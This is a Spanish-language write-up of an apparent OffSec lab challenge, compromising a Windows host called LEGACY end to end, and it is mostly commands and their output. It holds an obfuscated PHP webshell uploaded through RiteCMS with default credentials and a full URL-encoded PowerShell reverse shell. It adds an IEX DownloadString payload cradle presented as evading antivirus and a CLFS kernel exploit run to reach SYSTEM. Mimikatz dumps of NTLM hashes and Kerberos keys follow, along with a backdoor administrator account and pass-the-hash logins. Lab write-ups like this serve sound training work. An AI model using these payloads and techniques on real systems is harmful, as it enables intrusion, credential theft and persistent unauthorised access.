## LEGACY

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# gobuster dir -u http://192.168.161.249:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.161.249:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 307]
/.hta                 (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/.htaccess.txt        (Status: 403) [Size: 307]
/.htaccess            (Status: 403) [Size: 307]
/.hta.txt             (Status: 403) [Size: 307]
/.htpasswd.php        (Status: 403) [Size: 307]
/.htaccess.php        (Status: 403) [Size: 307]
/.htpasswd.txt        (Status: 403) [Size: 307]
/aux.txt              (Status: 403) [Size: 307]
/aux                  (Status: 403) [Size: 307]
/aux.php              (Status: 403) [Size: 307]
/cgi-bin/             (Status: 403) [Size: 307]
/cms                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/cms/]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/CMS/]
/com1.txt             (Status: 403) [Size: 307]
/com2.php             (Status: 403) [Size: 307]
/com2                 (Status: 403) [Size: 307]
/com1.php             (Status: 403) [Size: 307]
/com2.txt             (Status: 403) [Size: 307]
/com1                 (Status: 403) [Size: 307]
/com3.txt             (Status: 403) [Size: 307]
/com3                 (Status: 403) [Size: 307]
/com3.php             (Status: 403) [Size: 307]
/con.txt              (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/con.php              (Status: 403) [Size: 307]
/dashboard            (Status: 301) [Size: 354] [--> http://192.168.161.249:8000/dashboard/]
/examples             (Status: 503) [Size: 407]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/img/]
/Index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/licenses             (Status: 403) [Size: 426]
/lpt1                 (Status: 403) [Size: 307]
/lpt2                 (Status: 403) [Size: 307]
/lpt1.php             (Status: 403) [Size: 307]
/lpt2.php             (Status: 403) [Size: 307]
/lpt1.txt             (Status: 403) [Size: 307]
/lpt2.txt             (Status: 403) [Size: 307]
/nul.php              (Status: 403) [Size: 307]
/nul                  (Status: 403) [Size: 307]
/nul.txt              (Status: 403) [Size: 307]
/phpmyadmin           (Status: 403) [Size: 426]
/prn                  (Status: 403) [Size: 307]
/prn.txt              (Status: 403) [Size: 307]
/prn.php              (Status: 403) [Size: 307]
/server-info          (Status: 403) [Size: 426]
/server-status        (Status: 403) [Size: 426]
/webalizer            (Status: 403) [Size: 426]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

#### Paso 2: Explotacion del vector RCE por RiteCMS v3

1. Accedemos a la url `http//192.168.xxx.249:8000/cms/admin.php`
2. Ingresamos credenciales por defecto **admin/admin** y generamos un login exitoso.
3. De los 4 metodos que expone Exploit Database usaremos el segundo para evadir las reglas de .htaccess.
4. Creamos el webshell.pHp 
> ‚ö†Ô∏è Importante: usar la extensi√≥n **.pHp**, respetando may√∫sculas y min√∫sculas.

```php
<?php system($_GET[base64_decode('Y21k')]); ?>
```
#### Una vez creado el webshell.pHp lo subimos en cualquier directorio (media o files) y eso es todo. Tenemos RCE.
```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=whoami

legacy\adrian 

---

http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=ipconfig

Windows IP Configuration Ethernet adapter Ethernet0: 
Connection-specific DNS Suffix . : 
IPv4 Address. . . . . . . . . . . : 192.168.161.249 
Subnet Mask . . . . . . . . . . . : 255.255.255.0 
Default Gateway . . . . . . . . . : 192.168.161.254 

---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=net user

User accounts for \\LEGACY 
------------------------------------------------------------------------------- 
Administrator 
adrian 
damon 
DefaultAccount 
Guest 
WDAGUtilityAccount 
The command completed successfully.
---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=dir%20C:\Users\adrian\Desktop

Volume in drive C has no label. Volume Serial Number is 12DF-ECB8 Directory of C:\Users\adrian\Desktop 06/04/2025 02:01 PM
. 10/20/2022 01:45 AM
.. 06/04/2025 02:01 PM 34 local.txt 1 File(s) 34 bytes 2 Dir(s) 10,563,198,976 bytes free 
```
- Podemos obtener el primer flag: **local.txt**

```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=type%20C:\Users\adrian\Desktop\local.txt
```
- Necesitamos un reverse shell en Lecgacy para trabajar con mas comodidad

Podemos ejecutar en una sola linea a traves del mismo shell que subimos y luego subir un backdoor de metasploit para obtener un shell mas robusto y estable.
```
powershell%20-nop%20-c%20%22$client%20%3D%20New-Object%20System.Net.Sockets.TCPClient('192.168.45.239'%2C4444)%3B$stream%20%3D%20$client.GetStream()%3B[byte[]]$bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile(($i%20%3D%20$stream.Read($bytes%2C%200%2C%20$bytes.Length))%20-ne%200)%7B%3B$data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes%2C0%2C%20$i)%3B$sendback%20%3D%20(iex%20$data%202%3E%261%20%7C%20Out-String)%20%3B$sendback2%20%3D%20$sendback%20%2B%20'PS%20'%20%2B%20(pwd).Path%20%2B%20'%3E%20'%3B$sendbyte%20%3D%20([text.encoding]::ASCII).GetBytes($sendback2)%3B$stream.Write($sendbyte%2C0%2C$sendbyte.Length)%3B$stream.Flush()%7D%22
```
- En nuestro receptor nc:

```powershell
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.180.249] 62914
whoami
legacy\adrian
PS C:\xampp\htdocs\cms\media>
```

- Enumeracion rapida antes de obtener un mejor shell:

```
PS C:\Users\adrian\Desktop> whoami /all
                                                                                                                                                                                                                  
USER INFORMATION                                                                                                                                                                                                  
----------------                                                                                                                                                                                                  
                                                                                                                                                                                                                  
User Name     SID                                                                                                                                                                                                 
============= ============================================                                                                                                                                                        
legacy\adrian S-1-5-21-464543310-226837244-3834982083-1004


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Users\adrian\Desktop> 

```

#### üìå Resumen de lo encontrado
‚úÖ Usuario:

    legacy\adrian

    SID: S-1-5-21-464543310-226837244-3834982083-1004

‚úÖ Grupos:

    No forma parte de Administrators.

    Pero es miembro de Remote Desktop Users, lo que implica acceso por RDP si se habilita el servicio.

‚úÖ Privilegios destacados:

    SeImpersonatePrivilege ‚Üí ‚úÖ Cr√≠tico para escalada de privilegios

    SeChangeNotifyPrivilege ‚Üí com√∫n, no explotable

    SeCreateGlobalPrivilege ‚Üí √∫til en algunas condiciones

    SeIncreaseWorkingSetPrivilege ‚Üí normalmente no √∫til

Podemos usar PrintSpoofer para escalar privilegios y obtener credenciales para pivoting, movimiento lateral etc. pero antes debemos verificar
si el servicio **Spooler** esta corriendo y de lo contrario si podemos iniciarlo para ejecutar PrintSpoofer:

```powershell
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop> Start-Service -Name Spooler
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop>
```
Como no podemos iniciar el servicio, pasamos de momento a estabilizar el shell con **msf**

1. Creamos el backdoor.

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.239 LPORT=443 -f psh-reflection -o meterpreter.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 772 bytes
Final size of psh-reflection file: 3551 bytes
Saved as: meterpreter.ps1
```

* `windows/x64/meterpreter/reverse_https`: m√°s estable y discreto que reverse_tcp.
* `-f psh-reflection`: formato para ejecuci√≥n directa en memoria v√≠a PowerShell.
* `meterpreter.ps1`: script que cargar√°s desde la v√≠ctima.

2. Levantamos un servidor en nuestro kali
3. Configuramos y ejecutamos nuestro meterpreter:
```meterpreter
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.45.239:443
[*] https://192.168.45.239:443 handling request from 192.168.180.249; (UUID: naypubax) Staging x64 payload (204892 bytes) ...
[*] Meterpreter session 1 opened (192.168.45.239:443 -> 192.168.180.249:62948) at 2025-06-05 10:57:56 -0300
```
4. Desde la maquina victima solicitamos y ejecutamos el backdoor.
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```
> Datos sobre este comando

‚û°Ô∏è Descarga y ejecuta en memoria directamente el contenido del script (meterpreter.ps1) desde nuestro servidor.

    DownloadString(...) ‚Üí baja el texto del script.

    IEX (alias de Invoke-Expression) ‚Üí ejecuta ese texto como c√≥digo PowerShell.

üî∏ No deja rastro en disco
üî∏ Ideal para bypassear AVs b√°sicos o EDRs sin disco

#### Paso 2: Escalada de privilegios en LEGACY
1. Enumeracion con nuestro meterpreter

La enumeracion basica que generamos nos da los mismos resultados que ya teniamos. Ejecutamos la session actual de meterpreter en background
y utilizamos el modulo **suggester**

```meterpreter
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.180.249 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.180.249 - 203 exploit checks are being tried...
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 192.168.180.249 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 192.168.180.249 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006
[+] 192.168.180.249 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 192.168.180.249 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022                                                                                        
 2   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.                                                                     
 3   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                    
 4   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006                                                                                                  
 5   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022    
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
```
En pricipio vimos SeImpersonatePrivileges habilitados pero el servicio Spooler que necesitamos 
no se encuentra disponible, y tampoco tenemos permisos para iniciarlo.

Podemos intentar con **clfs_driver** en comparacion con **Spooler fool**

#### üß† Comparaci√≥n T√©cnica de los Exploits

| CVE                | Nombre      | Requiere servicios | Requiere reinicio | Fiabilidad | Compatibilidad con Win Server 2022 |
| ------------------ | ----------- | ------------------ | ----------------- | ---------- | ---------------------------------- |
| **CVE-2022-21999** | SpoolFool   | **S√≠**, `Spooler`  | No                | Media      | Compatible si el spooler corre     |
| **CVE-2023-28252** | CLFS Driver | **No**             | No                | **Alta**   | ‚úîÔ∏è Confirmado por Metasploit       |

#### Utilizamos msf el exploit clfs:

```meterpreter
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > LHOST 192.168.45.239
[-] Unknown command: LHOST. Did you mean hosts? Run the help command for more details.
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run
[*] Started reverse TCP handler on 192.168.45.239:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching msiexec to host the DLL...
[+] Process 4180 launched.
[*] Reflectively injecting the DLL into 4180...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.180.249
[*] Meterpreter session 2 opened (192.168.45.239:1234 -> 192.168.180.249:62876) at 2025-06-05 17:05:53 -0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
- Cargamos **kiwi** para obtener credenciales:

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  NTLM                              SHA1
--------       ------  ----                              ----
Administrator  LEGACY  387aef0561b65e4f3cae0960b0fba2d5  d85af7697714a10fdc862d2a36cfe1cfb9df046b
adrian         LEGACY  e3cea06e2de8d54d43b84d4b5bffb5b0  0471c9cb2ae0977d6fa051e6252d272a0e81ca75
pwned          LEGACY  8119935c5f7fa5f57135620c8073aaca  f60d7d6f41f4e0232b620aa2429cdaba85abc63d

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
LEGACY$        WORKGROUP  (null)
adrian         LEGACY     (null)
pwned          LEGACY     (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
adrian         LEGACY     (null)
legacy$        WORKGROUP  (null)
pwned          LEGACY     (null)


meterpreter > 
```
> El usuario **pwned** es un usuario que genere yo para entrar por RDP:
```
meterpreter > shell
Process 4500 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\cms\media>cd C:\Users
cd C:\Users

C:\Users>net user pwned password123! /add
net user pwned password123! /add
The command completed successfully.


C:\Users>net localgroup Administrators pwned /add                                                                       
net localgroup Administrators pwned /add                                                                                
The command completed successfully.                                                                                     


C:\Users>net localgroup "Remote Desktop Users" pwned /add
net localgroup "Remote Desktop Users" pwned /add
The command completed successfully.


C:\Users>
```
#### Obtenemos el flag proof en .180.249

```powershell
PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContin        ue

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\adrian\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 local.txt                                                            

    Directory: C:\Users\damon\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 proof.txt                                                            


PS C:\Users\Administrator\Desktop> 

PS C:\Users> type damon\Desktop\proof.txt
type damon\Desktop\proof.txt
bda74c52627c3c64c3f59514ca124ed7
PS C:\Users>
```
- Ya obtivimos un hash NTLM del usuario administrador. 

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# evil-winrm -i 192.168.180.249 -u 'Administrator' -H 387aef0561b65e4f3cae0960b0fba2d5 -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
- A partir de este punto podemos acceder a esta maquina con permisos administrativos elevados y utilizar el host como punto de pivote mas adelante.

Buscamos mas credenciales en el host:

```powershell
meterpreter > kiwi_cmd "lsadump::sam"
Domain : LEGACY
SysKey : 64739ab3729cd3b69b8a2112d7f813bd
Local SID : S-1-5-21-464543310-226837244-3834982083

SAMKey : 182f3f06a90f8964d5f3e42a4471f991

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 387aef0561b65e4f3cae0960b0fba2d5

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 43c134075ee0781f000afa9852286526

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f63ebd63ab3648b2fd2b564171599b1ccef1dd2ae516747268e8e8c4b039b62
      aes128_hmac       (4096) : a8157f683f9b1ccf5eda82f45efb3645
      des_cbc_md5       (4096) : 297c2c64e0f7c1f1
    OldCredentials
      aes256_hmac       (4096) : 5d8412c2b5c287800912c25e1d01726d0a38dc92620817ac8b3a3695527b9176
      aes128_hmac       (4096) : d03fccb1f24da612e10c2dcc95ab1162
      des_cbc_md5       (4096) : 1004b6fe26da7a4a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYAdministrator
    Credentials
      des_cbc_md5       : 297c2c64e0f7c1f1
    OldCredentials
      des_cbc_md5       : 1004b6fe26da7a4a


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 1ab23de33bb51f7526de86958813cc52

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : bd034c3348b4c73a68bd0764114b4c3f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9ea70bf88c7654331ee08c544988a68cd1bd0080522ebd67d6b02996920d224c
      aes128_hmac       (4096) : 8379e6ae1779b92efacf24d6e65db8c2
      des_cbc_md5       (4096) : 1a1c01f797c7d97f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 1a1c01f797c7d97f


RID  : 000003eb (1003)
User : damon
  Hash NTLM: 820d6348890893116880101307197052

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a49961c60b9d2aaeec9bb7c61ef6d1cd

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYdamon
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3f799da4cbaa571b4467cd05bbe29e38f83e06d6c9bc1b9366e8f45d32c5c46
      aes128_hmac       (4096) : 59a4a6226b3adbe1f22a3bdf8cdef2c5
      des_cbc_md5       (4096) : 809707e5a21f585b
    OldCredentials
      aes256_hmac       (4096) : 256f14b48c75d006ada2471a6f6c48391528410d0948293db856c8ef1bb2eac5
      aes128_hmac       (4096) : d5e61e12c02242aacbb974008e04bbc8
      des_cbc_md5       (4096) : 0164388cef4664fd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYdamon
    Credentials
      des_cbc_md5       : 809707e5a21f585b
    OldCredentials
      des_cbc_md5       : 0164388cef4664fd


RID  : 000003ec (1004)
User : adrian
  Hash NTLM: e3cea06e2de8d54d43b84d4b5bffb5b0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0fe6dc1f684e736780d99ac621d13651

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYadrian
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9d6caa520339858826216e146f197175983152ca6cc23600c90c59bb9f26ecca
      aes128_hmac       (4096) : 98a2a006eba652cdd5173acf15c16de8
      des_cbc_md5       (4096) : 45d6685898ae3e52
    OldCredentials
      aes256_hmac       (4096) : a1442b55e43679adca87f4cc85ff4a81cba38d6f967f15bfb79cff931f7fa1f6
      aes128_hmac       (4096) : 1b7ef6c5e883574d964cf0a80f3bd097
      des_cbc_md5       (4096) : 46c457ae237fd67c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYadrian
    Credentials
      des_cbc_md5       : 45d6685898ae3e52
    OldCredentials
      des_cbc_md5       : 46c457ae237fd67c


RID  : 000003ed (1005)
User : pwned
  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 45fefcdc634f3d8931565bbed0275460

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYpwned
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b79d6551adebfe18ef9f0230d94a17c5cfb226b25de0ad73dc122a417aed12e5
      aes128_hmac       (4096) : 7978a7fed2bd218bc91190cb5d9995c4
      des_cbc_md5       (4096) : a86462dcda2cab10

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYpwned
    Credentials
      des_cbc_md5       : a86462dcda2cab10
```

- **Con estas credenciales nos aseguramos el acceso al host LEGACY**

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# evil-winrm -i 192.168.180.249 -u 'damon' -H 820d6348890893116880101307197052 -P 5985 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\damon\Documents> 
```
- **Varios doritos despues no encontramos nada de interes en LEGACY** 

> Continuamos con **MSF** en la maquina 192.168.231.245

1. Ejecutamos **db_nmap** para poder automatizar un poco la enumeracion de la misma.

```bash
msf6> db_nmap -A 192.168.231.245
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 17:55 -03
[*] Nmap: Nmap scan report for 192.168.231.245
[*] Nmap: Host is up (0.17s latency).
[*] Nmap: Not shown: 995 closed tcp ports (reset)                                                                                                                                                                 
[*] Nmap: PORT     STATE SERVICE  VERSION                                                                                                                                                                         
[*] Nmap: 21/tcp   open  ftp      vsftpd 2.0.8 or later                                                                                                                                                           
[*] Nmap: | ftp-syst:                                                                                                                                                                                             
[*] Nmap: |   STAT:                                                                                                                                                                                               
[*] Nmap: | FTP server status:                                                                                                                                                                                    
[*] Nmap: |      Connected to 192.168.45.239                                                                                                                                                                      
[*] Nmap: |      Logged in as ftp                                                                                                                                                                                 
[*] Nmap: |      TYPE: ASCII                                                                                                                                                                                      
[*] Nmap: |      No session bandwidth limit                                                                                                                                                                       
[*] Nmap: |      Session timeout in seconds is 300                                                                                                                                                                
[*] Nmap: |      Control connection is plain text                                                                                                                                                                 
[*] Nmap: |      Data connections will be plain text                                                                                                                                                              
[*] Nmap: |      At session startup, client count was 3                                                                                                                                                           
[*] Nmap: |      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                              
[*] Nmap: |_End of status                                                                                                                                                                                         
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                  
[*] Nmap: 80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)                                                                                                           
[*] Nmap: |_http-title: RELIA Corp.                                                                                                                                                                               
[*] Nmap: | http-methods:                                                                                                                                                                                         
[*] Nmap: |_  Potentially risky methods: TRACE                                                                                                                                                                    
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8                                                                                                                     
[*] Nmap: 443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)                                                                                                           
[*] Nmap: | http-methods:                                                                                                                                                                                         
[*] Nmap: |_  Potentially risky methods: TRACE                                                                                                                                                                    
[*] Nmap: |_http-title: RELIA Corp.                                                                                                                                                                               
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
[*] Nmap: | ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
[*] Nmap: | Not valid before: 2022-10-12T08:55:44
[*] Nmap: |_Not valid after:  2032-10-09T08:55:44
[*] Nmap: |_ssl-date: TLS randomness does not represent time
[*] Nmap: | tls-alpn:
[*] Nmap: |_  http/1.1
[*] Nmap: 2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
[*] Nmap: |   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
[*] Nmap: |_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
[*] Nmap: 8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-open-proxy: Proxy might be redirecting requests
[*] Nmap: |_http-title: Site doesn't have a title (text/html).
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
